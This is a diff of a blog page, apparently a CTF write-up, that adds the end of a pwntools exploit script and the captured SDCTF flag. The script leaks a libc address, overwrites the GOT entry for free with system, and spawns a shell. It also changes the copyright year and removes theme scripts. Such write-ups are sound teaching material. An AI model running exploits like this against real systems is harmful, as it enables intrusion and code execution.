+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"remove\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n1. '</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"little"</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc leak"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># obj.orders[0] = exe.got["free"]</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># exe.got["free"] = libc.sym["system"]</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># free(obj.orders[2]) => system("/bin/sh")</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"remove\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}</p>
 
@@ -277,7 +399,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -304,28 +426,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
